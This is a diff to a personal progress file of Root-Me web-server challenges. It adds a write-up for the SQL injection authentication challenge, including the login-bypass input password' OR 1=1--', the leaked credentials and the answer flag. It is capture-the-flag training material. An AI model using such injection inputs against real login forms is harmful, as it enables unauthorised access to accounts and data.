@@ -1,4 +1,4 @@
-# [Root-Me](./rootme.md) Root-Me Web Server [25/74]
+# [Root-Me](./rootme.md) Root-Me Web Server [27/74]
 
 Discover the mechanisms, protocols and technologies used on the Internet and learn to abuse them!
 
@@ -31,7 +31,7 @@ These challenges are designed to train users on HTML, HTTP and other server side
 23. [JWT - Revoked token](#jwt-revoked-token) 🗸
 24. [PHP - assert()](#php-assert) 🗸
 25. [PHP - Filters](#php-filters) 🗸
-26. [PHP - register globals](#php-register-globals)
+26. [PHP - register globals](#php-register-globals) 🗸
 27. [PHP - Remote Xdebug](#php-remote-xdebug)
 28. [Python - Server-side Template Injection Introduction](#python-server-side-template-injection-introduction)
 29. [File upload - ZIP](#file-upload-zip)
@@ -45,7 +45,7 @@ These challenges are designed to train users on HTML, HTTP and other server side
 37. [PHP - preg_replace()](#php-preg-replace)
 38. [PHP - type juggling](#php-type-juggling)
 39. [Remote File Inclusion](#remote-file-inclusion)
-40. [SQL injection - Authentication](#sql-injection-authentication)
+40. [SQL injection - Authentication](#sql-injection-authentication) 🗸
 41. [SQL injection - Authentication - GBK](#sql-injection-authentication-gbk)
 42. [SQL injection - String](#sql-injection-string)
 43. [XSLT - Code execution](#xslt-code-execution)
@@ -2886,6 +2886,101 @@ NoTQYipcRKkgrqG
 
 ---
 
+
+## SQL injection Authentication
+
+- Author: g0uZ
+- Date: 27 February 2011
+- Points: 30
+- Level: 3
+
+### Statement
+
+Retrieve the administrator password
+
+### Links
+
+1. [challenge site](http://challenge01.root-me.org/web-serveur/ch9/).
+
+### Resources
+
+1. [Blackhat Europe 2009 - Advanced SQL injection whitepaper](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Blackhat%20Europe%202009%20-%20Advanced%20SQL%20injection%20whitepaper.pdf).
+2. [Guide to PHP security: chapter 3 SQL injection](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Guide%20to%20PHP%20security%20:%20chapter%203%20SQL%20injection.pdf).
+3. [BLackhat US 2006: SQL Injections by truncation](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Blackhat%20US%202006%20:%20SQL%20Injections%20by%20truncation.pdf).
+4. [Manipulating SQL server using SQL injection](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Manipulating%20SQL%20server%20using%20SQL%20injection.pdf).
+
+### Solutions
+
+<details>
+
+<summary markdown="span">Solution 1</summary>
+
+Visiting the website, we find a html page which we can format using an [online beautier](https://htmlbeautify.com/):
+
+~~~html
+<html>
+  <body>
+    <link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' />
+    <iframe id='iframe' src='https://www.root-me.org/?page=externe_header'>
+    </iframe>
+    <h1>Authentication v 0.01
+    </h1>
+    <form action="" method="post">
+      Login&nbsp;
+      <br/>
+      <input type="text" name="login" />
+      <br/>
+      <br/>
+      Password&nbsp;
+      <br/>
+      <input type="password" name="password" />
+      <br/>
+      <br/>
+      <br/>
+      <br/>
+      <input type="submit" value="connect" />
+      <br/>
+      <br/>
+    </form>
+  </body>
+</html>
+~~~
+
+The challenge refers to SQL injection, we can try multiple templates and are successful with:
+
+~~~
+username = admin
+password = password' OR 1=1--'
+~~~
+
+This provides the login details for user1:
+
+~~~
+username = user1
+password = TYsgv75zgtq
+~~~
+
+This is returning an incorrect record.  We can use the [SQLite LIMIT](https://www.sqlitetutorial.net/sqlite-limit/) clause to constrain the number of rows returned by the query.
+
+</details>
+
+### Answer
+
+<details>
+
+<summary markdown="span">Answer</summary>
+
+~~~
+t0_W34k!$
+~~~
+
+</details>
+
+---
+
+### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)
+
+---
 
 Last updated Jan 2022.
 
